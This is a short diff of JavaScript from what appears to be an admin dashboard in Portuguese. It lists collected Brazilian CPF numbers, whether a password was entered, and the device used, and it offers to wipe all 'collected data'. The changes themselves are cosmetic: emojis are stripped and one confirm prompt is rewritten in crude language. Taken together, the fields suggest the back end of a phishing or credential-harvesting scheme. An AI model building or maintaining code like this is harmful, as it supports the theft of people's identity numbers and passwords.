@@ -1189,7 +1189,7 @@
         container.innerHTML = logs.map(log => `
             <div class="log-item">
                 <div class="log-time">${new Date(log.data).toLocaleString()}</div>
-                <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo === 'senha_inserida' ? '🔐 SENHA' : '📝 CPF'}</span>
+                <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span>
                 <div><strong>${formatarCPF(log.cpf)}</strong></div>
                 <div>${log.dispositivo || '-'}</div>
             </div>
@@ -1238,7 +1238,7 @@
     }
 
     async function limparTodosDados() {
-        if (!confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados coletados. Continuar?')) return;
+        if (!confirm('ATENÇÃO! praq diabo tu vai apagar essa merda? quer continuar?')) return;
         try {
             await fetch('/api/admin/clear', {
                 method: 'POST',
@@ -1272,19 +1272,19 @@
     const msgDiv = document.getElementById('senhaMsg');
     
     if (!senhaAntiga) {
-        msgDiv.innerHTML = '<span style="color: #f87171;">❌ Digite a senha atual</span>';
+        msgDiv.innerHTML = '<span style="color: #f87171;">Digite a senha atual</span>';
         setTimeout(() => msgDiv.innerHTML = '', 3000);
         return;
     }
     
     if (!novaSenha || novaSenha.length < 6) {
-        msgDiv.innerHTML = '<span style="color: #f87171;">❌ Nova senha deve ter pelo menos 6 caracteres</span>';
+        msgDiv.innerHTML = '<span style="color: #f87171;">Nova senha deve ter pelo menos 6 caracteres</span>';
         setTimeout(() => msgDiv.innerHTML = '', 3000);
         return;
     }
     
     if (novaSenha !== confirmarSenha) {
-        msgDiv.innerHTML = '<span style="color: #f87171;">❌ As senhas não coincidem</span>';
+        msgDiv.innerHTML = '<span style="color: #f87171;">As senhas não coincidem</span>';
         setTimeout(() => msgDiv.innerHTML = '', 3000);
         return;
     }
